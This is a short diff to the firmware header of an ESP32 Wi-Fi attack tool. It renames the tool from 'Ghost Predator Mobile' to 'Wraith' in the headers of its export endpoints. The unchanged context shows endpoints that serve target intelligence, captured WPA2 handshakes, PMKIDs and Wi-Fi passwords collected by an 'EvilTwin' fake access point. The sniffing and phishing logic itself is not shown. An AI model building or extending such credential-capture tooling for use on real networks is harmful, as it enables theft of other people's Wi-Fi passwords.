@@ -1,4 +1,4 @@
-#pragma once
+﻿#pragma once
 #include <Arduino.h>
 #include <WiFi.h>
 #include <ESPAsyncWebServer.h>
@@ -531,7 +531,7 @@ private:
             req->send(200,"application/json","{\"ok\":true}");
         });
         server.on("/api/export/intel", HTTP_GET, [](AsyncWebServerRequest* req) {
-            String out = "# Ghost Predator Mobile — Target Intelligence Report\n";
+            String out = "# Wraith — Target Intelligence Report\n";
             out += "# Gerado: " + String(millis()/1000) + "s uptime\n\n";
             out += "## DISPOSITIVOS (" + String(TargetIntel::get().devices.size()) + ")\n";
             for (auto& d : TargetIntel::get().devices)
@@ -820,7 +820,7 @@ private:
             req->send(200, "text/plain", Sniffer::get().pmkids.empty() ? "# Nenhum PMKID\n" : out);
         });
         server.on("/api/export/handshakes", HTTP_GET, [](AsyncWebServerRequest* req) {
-            String out = "# Ghost Predator Mobile — Handshakes WPA2\n";
+            String out = "# Wraith — Handshakes WPA2\n";
             out += "# Formato: BSSID | CLIENT | TIPO | BYTES\n";
             for (auto& h : Sniffer::get().handshakes) {
                 out += h.bssid + " | " + h.client + " | M" + String(h.type) + " | " + String(h.len) + "B\n";
@@ -828,7 +828,7 @@ private:
             req->send(200, "text/plain", out);
         });
         server.on("/api/export/creds", HTTP_GET, [](AsyncWebServerRequest* req) {
-            String out = "# Ghost Predator Mobile — Credenciais Capturadas\n";
+            String out = "# Wraith — Credenciais Capturadas\n";
             for (auto& c : EvilTwin::get().captured)
                 out += "SSID:" + c.ssid + " | PASS:" + c.password + " | IP:" + c.ip + "\n";
             req->send(200, "text/plain", out.isEmpty() ? "# Nenhuma credencial\n" : out);
